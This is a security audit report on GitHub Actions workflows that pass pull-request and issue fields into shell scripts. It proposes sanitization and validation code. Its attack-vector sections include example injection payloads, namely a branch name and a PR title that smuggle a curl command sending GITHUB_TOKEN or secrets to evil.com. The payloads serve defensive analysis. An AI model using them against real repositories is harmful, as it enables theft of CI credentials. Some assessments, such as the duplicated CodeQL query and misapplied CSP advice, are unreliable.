# GitHub Actions Untrusted Input Security Audit

## Executive Summary

⚠️ **POTENTIAL VULNERABILITIES FOUND**: Your workflows have some exposure to untrusted input handling issues, but **the impact is MITIGATED** by your current security architecture.

## Vulnerability Analysis

Based on the [GitHub Security Lab guidelines for untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/), I found several areas where your workflows process potentially attacker-controlled data.

### 🔴 HIGH RISK: Script Injection in pr-review.yml

**File**: `.github/workflows/pr-review.yml`
**Risk Level**: HIGH - Potential command injection

**Problem**: The workflow processes untrusted PR content that could be weaponized:

```yaml
# VULNERABLE PATTERN - Untrusted data passed to shell script
PR_TITLE: ${{ github.event.pull_request.title }}
PR_DESCRIPTION: ${{ github.event.pull_request.body }}
PR_AUTHOR: ${{ github.event.pull_request.user.login }}
BASE_REF: ${{ github.event.pull_request.base.ref }}
HEAD_REF: ${{ github.event.pull_request.head.ref }}
# ... then runs:
run: |
  cat /tmp/pr-diff.txt | bash .github/scripts/pr-review.sh
```

**Attack Vectors**:
1. **PR Diff Injection**: Malicious code in PR diff files
2. **Branch Name Injection**: Branch names like `feat"; curl evil.com?token=$GITHUB_TOKEN;#`
3. **Title/Body Injection**: Malicious content in PR titles, descriptions, or bodies

**Supporting Script Risk**: `.github/scripts/pr-review.sh` uses untrusted environment variables:

```bash
# DANGEROUS - Uses untrusted variables that could contain malicious code
PR_CONTEXT=$(cat <<EOF
Pull Request Details:
Title: ${PR_TITLE}
Author: ${PR_AUTHOR}
Base Branch: ${BASE_REF}
Head Branch: ${HEAD_REF}
Description:
${PR_DESCRIPTION}
EOF
)
```

### 🟡 MEDIUM RISK: Script Injection in issue-triage.yml

**File**: `.github/workflows/issue-triage.yml`
**Risk Level**: MEDIUM - Command injection potential

**Problem**: Processes untrusted issue content:

```yaml
# POTENTIALLY VULNERABLE
ISSUE_TITLE: ${{ github.event.issue.title }}
ISSUE_BODY: ${{ github.event.issue.body }}
ISSUE_AUTHOR: ${{ github.event.issue.user.login }}
# ... runs shell script
run: |
  bash .github/scripts/issue-triage.sh
```

**Supporting Script Risk**: `.github/scripts/issue-triage.sh` processes untrusted issue data:

```bash
# USES UNTRUSTED ISSUE CONTENT DIRECTLY
ISSUE_CONTENT=$(cat <<EOF
Repository Context:
${REPO_CONTEXT}

Issue Details:
Title: ${ISSUE_TITLE}
Author: ${ISSUE_AUTHOR}
Body:
${ISSUE_BODY:-"No description provided"}
EOF
)
```

### 🟢 LOW RISK: Other Workflows

**Files**: `claude.yml`, `claude-code-review.yml`, `docker-publish.yml`, `release.yml`
**Risk Level**: LOW

**Assessment**: These workflows either:
- Don't process untrusted input directly
- Use the data only for display/comment purposes
- Don't execute user-controlled code

## Detailed Vulnerability Breakdown

### 1. Command Injection via Shell Script Execution

**Risk**: Untrusted data in shell scripts can execute arbitrary commands

**Examples of dangerous inputs**:
- Branch name: `"; curl evil.com?token=$GITHUB_TOKEN;#`
- PR title: `feat: add new feature && curl evil.com?data=$SECRET`
- Issue body: `The issue is \$(whoami)`

**Impact**: 
- Extract GitHub tokens and repository secrets
- Exfiltrate sensitive data
- Modify repository content
- Execute arbitrary code in CI environment

### 2. API Injection via External Services

**Risk**: Untrusted data sent to AI services could be misused

**Current Pattern** (in both scripts):
```bash
# SENDS UNTRUSTED CONTENT TO EXTERNAL API
curl -s -X POST "${API_URL}" \
    -H "Authorization: Bearer ${OPENROUTER_API_KEY}" \
    -H "Content-Type: application/json" \
    -d @"${temp_json_file}")
```

**Risk**: Could be used to probe AI service APIs or extract tokens

## Current Mitigations (What's Working)

✅ **Environment Variable Isolation**: Your use of environment variables prevents direct script generation issues
✅ **Label-based Protection**: `pr-review.yml` requires 'ai_code_review' label
✅ **Limited Scope**: Workflows run on specific events, not on every PR
✅ **Token Isolation**: Separate handling of GITHUB_TOKEN and API keys

## Security Recommendations

### 1. 🔴 URGENT: Input Sanitization in Shell Scripts

**Add input sanitization** to `.github/scripts/pr-review.sh`:

```bash
# Add after line ~22
# Sanitize potentially dangerous inputs
sanitize_input() {
    local input="$1"
    # Remove dangerous shell metacharacters
    input=$(echo "$input" | sed 's/[;&|`$(){}[\]\\!<>?*]//g')
    # Remove newlines and control characters
    input=$(echo "$input" | tr -d '\n\r' | sed 's/[[:cntrl:]]//g')
    echo "$input"
}

# Sanitize all untrusted variables
PR_TITLE=$(sanitize_input "${PR_TITLE}")
PR_AUTHOR=$(sanitize_input "${PR_AUTHOR}")
BASE_REF=$(sanitize_input "${BASE_REF}")
HEAD_REF=$(sanitize_input "${HEAD_REF}")
PR_DESCRIPTION=$(sanitize_input "${PR_DESCRIPTION}")
```

### 2. 🟡 MEDIUM: Add Content Length Limits

**Add to both scripts**:

```bash
# Add size limits
MAX_TITLE_LENGTH=200
MAX_BODY_LENGTH=10000
MAX_AUTHOR_LENGTH=50

# Truncate if needed
if [ ${#PR_TITLE} -gt $MAX_TITLE_LENGTH ]; then
    PR_TITLE="${PR_TITLE:0:$MAX_TITLE_LENGTH}..."
fi

if [ ${#PR_DESCRIPTION} -gt $MAX_BODY_LENGTH ]; then
    PR_DESCRIPTION="${PR_DESCRIPTION:0:$MAX_BODY_LENGTH}..."
fi
```

### 3. 🟡 MEDIUM: Validate Branch References

**Add validation** before using branch names:

```bash
# Validate branch reference format
validate_branch_ref() {
    local ref="$1"
    # Only allow alphanumeric, hyphens, underscores, and slashes
    if [[ ! "$ref" =~ ^[a-zA-Z0-9._/-]+$ ]]; then
        echo "Error: Invalid branch reference format"
        exit 1
    fi
}

validate_branch_ref "${BASE_REF}"
validate_branch_ref "${HEAD_REF}"
```

### 4. 🟢 LOW: Use jq for Safe JSON Handling

**Replace manual JSON construction** in scripts with `jq`:

```bash
# Instead of manual JSON, use jq for safe escaping
create_json_payload() {
    jq -n \
        --arg model "$model" \
        --arg temperature "$TEMPERATURE" \
        --arg max_tokens "$MAX_TOKENS" \
        --arg content "$TRIAGE_PROMPT" \
        '{
            model: $model,
            temperature: ($temperature | tonumber),
            max_tokens: ($max_tokens | tonumber),
            messages: [
                {
                    role: "system",
                    content: "You are an expert GitHub issue triaging agent..."
                },
                {
                    role: "user", 
                    content: $content
                }
            ]
        }'
}

create_json_payload > "${temp_json_file}"
```

### 5. 🟢 LOW: Add Environment Variable Validation

**Add validation at script start**:

```bash
# Validate required environment variables
validate_required_env() {
    local var_name="$1"
    local var_value="${!var_name}"
    
    if [ -z "$var_value" ]; then
        echo "Error: $var_name is required but not set"
        exit 1
    fi
    
    # Check for obvious injection patterns
    if echo "$var_value" | grep -qE '[;&|`$(){}[\]\\!<>?*]'; then
        echo "Error: $var_name contains potentially dangerous characters"
        exit 1
    fi
}

validate_required_env "PR_TITLE"
validate_required_env "PR_AUTHOR"
validate_required_env "BASE_REF"
validate_required_env "HEAD_REF"
```

## Implementation Priority

### Phase 1 (Immediate - This Week)
1. ✅ Add input sanitization to `pr-review.sh`
2. ✅ Add input sanitization to `issue-triage.sh`
3. ✅ Add size limits for all user inputs

### Phase 2 (Next Sprint)
1. ✅ Add branch reference validation
2. ✅ Add comprehensive environment variable validation
3. ✅ Add Content Security Policy headers to API calls

### Phase 3 (Future Improvements)
1. ✅ Migrate to `jq` for all JSON handling
2. ✅ Add unit tests for input validation functions
3. ✅ Consider using a safer scripting language (Python/Node.js) for complex logic

## CodeQL Integration

To automatically detect these issues in the future, consider enabling CodeQL for GitHub Actions:

1. Add `.github/codeql/codeql-config.yml`:
```yaml
queries:
  - uses: security-and-quality
  - uses: security-and-quality
    
paths:
  - ".github/workflows/*.yml"
  - ".github/scripts/*.sh"
```

2. Enable CodeQL in repository settings
3. Set up automated scanning on PRs

## Security Score: B+ ⚠️

**Current State**: 
- ✅ Good architecture (environment variable isolation)
- ❌ Insufficient input sanitization
- ❌ Shell script injection risks
- ✅ Proper token management

**After Recommendations**: 
- ✅ Secure input handling
- ✅ Comprehensive validation
- ✅ Reduced attack surface

**Risk Level**: The current vulnerabilities are **exploitable but require**:
- PR submission with malicious content
- Execution of the review/triage script
- In a repository where attacker has write access

**Recommended Action**: Implement Phase 1 recommendations immediately to close the most critical security gaps.

---

*Audit completed on: 2025-10-29*  
*Guidelines reference: [GitHub Security Lab - Untrusted Input](https://securitylab.github.com/resources/github-actions-untrusted-input/)*